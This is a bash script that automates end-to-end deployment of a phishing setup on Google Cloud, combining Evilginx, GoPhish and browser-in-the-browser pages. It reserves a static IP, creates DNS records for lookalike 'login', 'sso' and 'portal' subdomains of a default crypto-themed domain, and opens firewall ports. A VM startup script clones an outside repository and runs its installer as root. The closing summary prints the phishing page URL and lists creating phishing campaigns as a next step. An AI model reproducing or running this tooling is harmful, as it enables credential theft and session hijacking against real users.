#!/bin/bash

#############################################
# Frameless BITB - MASTER DEPLOYMENT SCRIPT
# Complete automation from ZERO to fully functional phishing infrastructure
# Designed for Google Cloud Shell
#############################################

set -e

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'
BOLD='\033[1m'

# Configuration - CHANGE THESE VALUES
DOMAIN="${DOMAIN:-exodustraderai.info}"
EMAIL="${EMAIL:-admin@${DOMAIN}}"
PROJECT_ID="${GCP_PROJECT_ID:-phishing-infra-$(date +%s)}"
INSTANCE_NAME="${INSTANCE_NAME:-evilginx-server}"
ZONE="${ZONE:-us-central1-a}"
REGION="${REGION:-us-central1}"
MACHINE_TYPE="${MACHINE_TYPE:-e2-medium}"
BOOT_DISK_SIZE="${BOOT_DISK_SIZE:-30GB}"
USE_CLOUD_DNS="${USE_CLOUD_DNS:-true}"  # Set to false to skip Cloud DNS
YOUR_IP=""

# Logging functions
log() {
    echo -e "${GREEN}[✓]${NC} $1"
}

error() {
    echo -e "${RED}[✗]${NC} $1"
    exit 1
}

warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

info() {
    echo -e "${BLUE}[ℹ]${NC} $1"
}

prompt() {
    echo -e "${CYAN}[?]${NC} $1"
}

header() {
    echo ""
    echo -e "${BOLD}${BLUE}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}${BLUE}  $1${NC}"
    echo -e "${BOLD}${BLUE}═══════════════════════════════════════════════════════════════${NC}"
    echo ""
}

# Display banner
show_banner() {
    clear
    echo -e "${MAGENTA}"
    cat << "EOF"
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║     FRAMELESS BITB - MASTER DEPLOYMENT AUTOMATION             ║
║                                                               ║
║     Complete GCP Infrastructure Setup                         ║
║     From ZERO to Fully Functional Phishing Infrastructure    ║
║                                                               ║
║     Components: Evilginx + GoPhish + Apache + BITB            ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
    echo ""
}

# Check if running in Cloud Shell
detect_environment() {
    header "Phase 1/10: Environment Detection"

    if [ -n "$CLOUD_SHELL" ]; then
        log "Running in Google Cloud Shell ☁️"
        log "Already authenticated with Google Cloud"
    else
        warning "Not running in Cloud Shell"
        info "This script is optimized for Cloud Shell but will work locally"

        # Check if gcloud is installed
        if ! command -v gcloud &> /dev/null; then
            error "gcloud CLI not found. Install from: https://cloud.google.com/sdk/docs/install"
        fi
        log "gcloud CLI found"
    fi

    # Get user IP
    info "Detecting your public IP address..."
    YOUR_IP=$(curl -s --max-time 5 https://api.ipify.org || curl -s --max-time 5 ifconfig.me || echo "")

    if [ -n "$YOUR_IP" ]; then
        log "Your public IP: $YOUR_IP"
    else
        warning "Could not auto-detect your IP"
        prompt "Enter your public IP (for firewall rules): "
        read -r YOUR_IP
    fi
}

# Show configuration
show_configuration() {
    header "Phase 2/10: Configuration Review"

    echo -e "${CYAN}Domain:${NC}              $DOMAIN"
    echo -e "${CYAN}Email:${NC}               $EMAIL"
    echo -e "${CYAN}Project ID:${NC}          $PROJECT_ID"
    echo -e "${CYAN}Instance Name:${NC}       $INSTANCE_NAME"
    echo -e "${CYAN}Region:${NC}              $REGION"
    echo -e "${CYAN}Zone:${NC}                $ZONE"
    echo -e "${CYAN}Machine Type:${NC}        $MACHINE_TYPE"
    echo -e "${CYAN}Disk Size:${NC}           $BOOT_DISK_SIZE"
    echo -e "${CYAN}Use Cloud DNS:${NC}       $USE_CLOUD_DNS"
    echo -e "${CYAN}Your IP:${NC}             $YOUR_IP"
    echo ""

    prompt "Continue with this configuration? (y/n): "
    read -r confirm

    if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
        info "Deployment cancelled. Edit the script to change configuration."
        exit 0
    fi

    log "Configuration confirmed"
}

# Create or select GCP project
setup_project() {
    header "Phase 3/10: GCP Project Setup"

    # Check if project exists
    if gcloud projects describe "$PROJECT_ID" &>/dev/null 2>&1; then
        log "Project '$PROJECT_ID' already exists"
    else
        info "Creating new project: $PROJECT_ID"
        gcloud projects create "$PROJECT_ID" --name="Phishing Infrastructure" || error "Failed to create project"
        log "Project created successfully"
    fi

    # Set current project
    info "Setting active project..."
    gcloud config set project "$PROJECT_ID" || error "Failed to set project"
    log "Active project set to: $PROJECT_ID"

    # Check billing
    echo ""
    warning "⚠️  BILLING REQUIRED ⚠️"
    info "You MUST enable billing for this project"
    info "Visit: https://console.cloud.google.com/billing/linkedaccount?project=$PROJECT_ID"
    echo ""
    prompt "Press ENTER after enabling billing..."
    read -r

    log "Project setup complete"
}

# Enable required APIs
enable_apis() {
    header "Phase 4/10: Enabling Google Cloud APIs"

    APIS=(
        "compute.googleapis.com:Compute Engine"
        "dns.googleapis.com:Cloud DNS"
        "cloudresourcemanager.googleapis.com:Resource Manager"
    )

    for api_info in "${APIS[@]}"; do
        API=$(echo "$api_info" | cut -d: -f1)
        NAME=$(echo "$api_info" | cut -d: -f2)

        info "Enabling $NAME API..."
        gcloud services enable "$API" 2>/dev/null || warning "Failed to enable $NAME"
        log "$NAME enabled"
    done

    # Wait for APIs to propagate
    info "Waiting for APIs to propagate (30 seconds)..."
    sleep 30

    log "All APIs enabled"
}

# Reserve static IP address
reserve_static_ip() {
    header "Phase 5/10: Reserving Static IP Address"

    IP_NAME="evilginx-static-ip"

    # Check if IP already exists
    if gcloud compute addresses describe "$IP_NAME" --region="$REGION" &>/dev/null 2>&1; then
        warning "Static IP already exists"
        STATIC_IP=$(gcloud compute addresses describe "$IP_NAME" --region="$REGION" --format="get(address)")
    else
        info "Creating static IP address..."
        gcloud compute addresses create "$IP_NAME" --region="$REGION" || error "Failed to reserve static IP"
        STATIC_IP=$(gcloud compute addresses describe "$IP_NAME" --region="$REGION" --format="get(address)")
        log "Static IP created"
    fi

    log "Static IP Address: $STATIC_IP"

    # Export for later use
    export STATIC_IP
}

# Setup Cloud DNS (optional)
setup_cloud_dns() {
    header "Phase 6/10: DNS Configuration"

    if [[ "$USE_CLOUD_DNS" =~ ^[Tt]rue$ ]]; then
        info "Setting up Google Cloud DNS..."

        DNS_ZONE_NAME=$(echo "$DOMAIN" | sed 's/\./-/g')-zone

        # Create DNS zone if it doesn't exist
        if gcloud dns managed-zones describe "$DNS_ZONE_NAME" &>/dev/null 2>&1; then
            warning "DNS zone already exists"
        else
            info "Creating DNS managed zone..."
            gcloud dns managed-zones create "$DNS_ZONE_NAME" \
                --dns-name="$DOMAIN." \
                --description="Phishing infrastructure DNS zone" || warning "Failed to create DNS zone"
            log "DNS zone created"
        fi

        # Get name servers
        NAME_SERVERS=$(gcloud dns managed-zones describe "$DNS_ZONE_NAME" --format="value(nameServers)" 2>/dev/null | tr ';' '\n')

        if [ -n "$NAME_SERVERS" ]; then
            echo ""
            echo -e "${YELLOW}═══════════════════════════════════════════════════════════════${NC}"
            echo -e "${YELLOW}  IMPORTANT: Update Name Servers at Your Registrar${NC}"
            echo -e "${YELLOW}═══════════════════════════════════════════════════════════════${NC}"
            echo ""
            echo -e "${CYAN}Domain:${NC} $DOMAIN"
            echo ""
            echo -e "${CYAN}Set these nameservers at your domain registrar:${NC}"
            echo "$NAME_SERVERS" | while read -r ns; do
                echo -e "  ${GREEN}→${NC} $ns"
            done
            echo ""
            info "After updating nameservers, wait 5-10 minutes for propagation"
            echo ""
            prompt "Press ENTER after updating nameservers..."
            read -r
        fi

        # Create DNS records
        info "Creating DNS A records..."

        # Start transaction
        gcloud dns record-sets transaction start --zone="$DNS_ZONE_NAME" 2>/dev/null || true

        # Add A records for various subdomains
        SUBDOMAINS=("" "www" "login" "account" "sso" "portal")

        for subdomain in "${SUBDOMAINS[@]}"; do
            if [ -z "$subdomain" ]; then
                RECORD_NAME="$DOMAIN."
            else
                RECORD_NAME="$subdomain.$DOMAIN."
            fi

            # Remove existing record if present
            gcloud dns record-sets transaction remove "$STATIC_IP" \
                --name="$RECORD_NAME" \
                --ttl=300 \
                --type=A \
                --zone="$DNS_ZONE_NAME" 2>/dev/null || true

            # Add new record
            gcloud dns record-sets transaction add "$STATIC_IP" \
                --name="$RECORD_NAME" \
                --ttl=300 \
                --type=A \
                --zone="$DNS_ZONE_NAME" 2>/dev/null || true
        done

        # Execute transaction
        gcloud dns record-sets transaction execute --zone="$DNS_ZONE_NAME" 2>/dev/null || warning "Some DNS records may already exist"

        log "Cloud DNS configured"

    else
        # Manual DNS configuration
        echo ""
        echo -e "${YELLOW}═══════════════════════════════════════════════════════════════${NC}"
        echo -e "${YELLOW}  IMPORTANT: Configure DNS A Records Manually${NC}"
        echo -e "${YELLOW}═══════════════════════════════════════════════════════════════${NC}"
        echo ""
        echo -e "${CYAN}Add these A records at your DNS provider:${NC}"
        echo ""
        echo -e "  ${GREEN}Type: A    Host: @           Value: ${STATIC_IP}${NC}"
        echo -e "  ${GREEN}Type: A    Host: *           Value: ${STATIC_IP}${NC}"
        echo -e "  ${GREEN}Type: A    Host: login       Value: ${STATIC_IP}${NC}"
        echo -e "  ${GREEN}Type: A    Host: account     Value: ${STATIC_IP}${NC}"
        echo -e "  ${GREEN}Type: A    Host: www         Value: ${STATIC_IP}${NC}"
        echo -e "  ${GREEN}Type: A    Host: sso         Value: ${STATIC_IP}${NC}"
        echo -e "  ${GREEN}Type: A    Host: portal      Value: ${STATIC_IP}${NC}"
        echo ""
        prompt "Press ENTER after configuring DNS records..."
        read -r

        log "DNS configuration noted"
    fi
}

# Create firewall rules
create_firewall_rules() {
    header "Phase 7/10: Configuring Firewall Rules"

    RULES=(
        "allow-http-phishing:80:HTTP traffic"
        "allow-https-phishing:443:HTTPS traffic"
        "allow-dns-phishing:53:DNS traffic"
        "allow-gophish-admin:3333:GoPhish admin"
    )

    for rule_info in "${RULES[@]}"; do
        RULE_NAME=$(echo "$rule_info" | cut -d: -f1)
        PORT=$(echo "$rule_info" | cut -d: -f2)
        DESC=$(echo "$rule_info" | cut -d: -f3)

        if gcloud compute firewall-rules describe "$RULE_NAME" &>/dev/null 2>&1; then
            warning "Firewall rule '$RULE_NAME' already exists"
        else
            info "Creating firewall rule for $DESC..."

            if [ "$PORT" == "3333" ]; then
                # Restrict GoPhish admin to user's IP
                gcloud compute firewall-rules create "$RULE_NAME" \
                    --target-tags=phishing-server \
                    --allow=tcp:$PORT \
                    --source-ranges="$YOUR_IP/32" \
                    --description="$DESC" || warning "Failed to create rule: $RULE_NAME"
            elif [ "$PORT" == "53" ]; then
                # DNS needs both TCP and UDP
                gcloud compute firewall-rules create "$RULE_NAME" \
                    --target-tags=phishing-server \
                    --allow=tcp:$PORT,udp:$PORT \
                    --source-ranges=0.0.0.0/0 \
                    --description="$DESC" || warning "Failed to create rule: $RULE_NAME"
            else
                gcloud compute firewall-rules create "$RULE_NAME" \
                    --target-tags=phishing-server \
                    --allow=tcp:$PORT \
                    --source-ranges=0.0.0.0/0 \
                    --description="$DESC" || warning "Failed to create rule: $RULE_NAME"
            fi

            log "Firewall rule created: $DESC"
        fi
    done

    log "Firewall configuration complete"
}

# Create VM startup script
create_vm_startup_script() {
    info "Generating VM startup script..."

    cat > /tmp/vm-startup.sh <<'STARTUP_SCRIPT_EOF'
#!/bin/bash

# VM Startup Script - Automated Installation
set -e

# Logging
exec > >(tee /var/log/phishing-setup.log)
exec 2>&1

echo "========================================="
echo "Frameless BITB Installation Starting"
echo "========================================="
date

# Wait for system initialization
echo "Waiting for system to initialize..."
sleep 30

# Update system
echo "Updating system packages..."
export DEBIAN_FRONTEND=noninteractive
apt-get update -qq
apt-get upgrade -y -qq

# Install git
echo "Installing Git..."
apt-get install -y git

# Clone the repository
echo "Cloning Frameless BITB repository..."
cd /root
if [ -d "bitbevilgophish" ]; then
    rm -rf bitbevilgophish
fi

git clone https://github.com/theroseinc/bitbevilgophish.git
cd bitbevilgophish

# Source configuration
echo "Loading configuration..."
if [ -f "config.env" ]; then
    source config.env
fi

# Override with our settings
export DOMAIN="DOMAIN_PLACEHOLDER"
export EMAIL="EMAIL_PLACEHOLDER"

# Run the enhanced installation script
echo "Running installation script..."
if [ -f "vm-install.sh" ]; then
    bash vm-install.sh
else
    echo "ERROR: vm-install.sh not found!"
    exit 1
fi

echo "========================================="
echo "Installation Complete!"
echo "========================================="
date

STARTUP_SCRIPT_EOF

    # Replace placeholders
    sed -i "s/DOMAIN_PLACEHOLDER/${DOMAIN}/g" /tmp/vm-startup.sh
    sed -i "s/EMAIL_PLACEHOLDER/${EMAIL}/g" /tmp/vm-startup.sh

    log "VM startup script created"
}

# Create VM instance
create_vm_instance() {
    header "Phase 8/10: Creating VM Instance"

    # Check if instance exists
    if gcloud compute instances describe "$INSTANCE_NAME" --zone="$ZONE" &>/dev/null 2>&1; then
        warning "Instance '$INSTANCE_NAME' already exists"
        prompt "Delete and recreate? (y/n): "
        read -r confirm

        if [[ "$confirm" =~ ^[Yy]$ ]]; then
            info "Deleting existing instance..."
            gcloud compute instances delete "$INSTANCE_NAME" --zone="$ZONE" --quiet
            log "Instance deleted"
        else
            info "Using existing instance"
            return 0
        fi
    fi

    # Create startup script
    create_vm_startup_script

    info "Creating VM instance (this may take a few minutes)..."

    gcloud compute instances create "$INSTANCE_NAME" \
        --zone="$ZONE" \
        --machine-type="$MACHINE_TYPE" \
        --image-family=ubuntu-2204-lts \
        --image-project=ubuntu-os-cloud \
        --boot-disk-size="$BOOT_DISK_SIZE" \
        --boot-disk-type=pd-balanced \
        --network-interface=address="$STATIC_IP",network-tier=PREMIUM \
        --tags=phishing-server,http-server,https-server \
        --metadata-from-file=startup-script=/tmp/vm-startup.sh || error "Failed to create VM instance"

    log "VM instance created: $INSTANCE_NAME"

    # Clean up
    rm -f /tmp/vm-startup.sh
}

# Monitor installation progress
monitor_installation() {
    header "Phase 9/10: Installation Progress Monitor"

    info "The VM is now installing all components..."
    info "This process takes approximately 15-30 minutes"
    echo ""

    warning "⏳ Please wait for 60 seconds while the VM initializes..."
    sleep 60

    log "Connecting to view installation logs..."
    echo ""
    echo -e "${YELLOW}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${YELLOW}Press Ctrl+C when you see 'Installation Complete!' in the logs${NC}"
    echo -e "${YELLOW}Or wait for the command to timeout automatically${NC}"
    echo -e "${YELLOW}═══════════════════════════════════════════════════════════════${NC}"
    echo ""
    sleep 3

    # Tail the installation log
    gcloud compute ssh "$INSTANCE_NAME" \
        --zone="$ZONE" \
        --command="sudo tail -f /var/log/phishing-setup.log" 2>/dev/null || true

    echo ""
    log "Installation monitoring complete"

    # Provide manual check command
    info "You can check installation status anytime with:"
    echo -e "  ${CYAN}gcloud compute ssh $INSTANCE_NAME --zone=$ZONE --command='sudo tail -f /var/log/phishing-setup.log'${NC}"
}

# Display final summary
show_final_summary() {
    header "Phase 10/10: Deployment Complete! 🎉"

    echo -e "${GREEN}✓ Project created:${NC}              $PROJECT_ID"
    echo -e "${GREEN}✓ VM instance created:${NC}          $INSTANCE_NAME"
    echo -e "${GREEN}✓ Static IP reserved:${NC}           $STATIC_IP"
    echo -e "${GREEN}✓ Firewall configured${NC}"
    echo -e "${GREEN}✓ DNS configuration ready${NC}"
    echo -e "${GREEN}✓ Installation in progress${NC}"
    echo ""

    echo -e "${BOLD}${YELLOW}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}${YELLOW}  ACCESS INFORMATION${NC}"
    echo -e "${BOLD}${YELLOW}═══════════════════════════════════════════════════════════════${NC}"
    echo ""

    echo -e "${CYAN}📧 Phishing Page:${NC}"
    echo -e "   https://login.${DOMAIN}/?auth=2"
    echo ""

    echo -e "${CYAN}🎯 GoPhish Admin Panel:${NC}"
    echo -e "   https://${STATIC_IP}:3333"
    echo -e "   ${YELLOW}(Default credentials shown on first login)${NC}"
    echo ""

    echo -e "${CYAN}🖥️  SSH Access:${NC}"
    echo -e "   gcloud compute ssh $INSTANCE_NAME --zone=$ZONE"
    echo ""

    echo -e "${BOLD}${YELLOW}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}${YELLOW}  MANAGEMENT COMMANDS${NC}"
    echo -e "${BOLD}${YELLOW}═══════════════════════════════════════════════════════════════${NC}"
    echo ""

    echo -e "${CYAN}Check installation status:${NC}"
    echo -e "  gcloud compute ssh $INSTANCE_NAME --zone=$ZONE --command='sudo tail -100 /var/log/phishing-setup.log'"
    echo ""

    echo -e "${CYAN}Check services status:${NC}"
    echo -e "  gcloud compute ssh $INSTANCE_NAME --zone=$ZONE --command='bitb-status'"
    echo ""

    echo -e "${CYAN}View logs:${NC}"
    echo -e "  gcloud compute ssh $INSTANCE_NAME --zone=$ZONE --command='bitb-logs'"
    echo ""

    echo -e "${CYAN}Restart services:${NC}"
    echo -e "  gcloud compute ssh $INSTANCE_NAME --zone=$ZONE --command='bitb-start'"
    echo ""

    echo -e "${CYAN}Stop VM:${NC}"
    echo -e "  gcloud compute instances stop $INSTANCE_NAME --zone=$ZONE"
    echo ""

    echo -e "${CYAN}Start VM:${NC}"
    echo -e "  gcloud compute instances start $INSTANCE_NAME --zone=$ZONE"
    echo ""

    echo -e "${CYAN}Delete VM (cleanup):${NC}"
    echo -e "  gcloud compute instances delete $INSTANCE_NAME --zone=$ZONE"
    echo ""

    echo -e "${BOLD}${YELLOW}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}${YELLOW}  NEXT STEPS${NC}"
    echo -e "${BOLD}${YELLOW}═══════════════════════════════════════════════════════════════${NC}"
    echo ""

    echo "1. ⏳ Wait for installation to complete (15-30 minutes)"
    echo "2. ✅ SSH into server and verify: sudo bash test-setup.sh"
    echo "3. 🌐 Test DNS resolution: nslookup $DOMAIN"
    echo "4. 🔒 Get SSL certificates (if using Let's Encrypt)"
    echo "5. 🎯 Access GoPhish admin and change default password"
    echo "6. 📧 Create phishing campaigns"
    echo "7. 🎣 Test phishing page: https://login.${DOMAIN}/?auth=2"
    echo ""

    echo -e "${BOLD}${GREEN}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}${GREEN}  DEPLOYMENT SUCCESSFUL! 🚀${NC}"
    echo -e "${BOLD}${GREEN}═══════════════════════════════════════════════════════════════${NC}"
    echo ""

    # Save configuration to file
    cat > gcp-deployment-info.txt <<EOF
=================================================================
FRAMELESS BITB - DEPLOYMENT INFORMATION
=================================================================
Deployment Date: $(date)

PROJECT INFORMATION:
- Project ID: $PROJECT_ID
- Region: $REGION
- Zone: $ZONE

INSTANCE INFORMATION:
- Instance Name: $INSTANCE_NAME
- Machine Type: $MACHINE_TYPE
- Static IP: $STATIC_IP

DOMAIN CONFIGURATION:
- Domain: $DOMAIN
- Email: $EMAIL

ACCESS URLS:
- Phishing Page: https://login.${DOMAIN}/?auth=2
- GoPhish Admin: https://${STATIC_IP}:3333

SSH COMMAND:
gcloud compute ssh $INSTANCE_NAME --zone=$ZONE --project=$PROJECT_ID

FIREWALL RULES:
- HTTP (80): Allowed from anywhere
- HTTPS (443): Allowed from anywhere
- DNS (53): Allowed from anywhere
- GoPhish Admin (3333): Restricted to $YOUR_IP

=================================================================
EOF

    log "Deployment information saved to: gcp-deployment-info.txt"
}

# Main execution flow
main() {
    show_banner
    detect_environment
    show_configuration
    setup_project
    enable_apis
    reserve_static_ip
    setup_cloud_dns
    create_firewall_rules
    create_vm_instance
    monitor_installation
    show_final_summary
}

# Execute main function
main "$@"
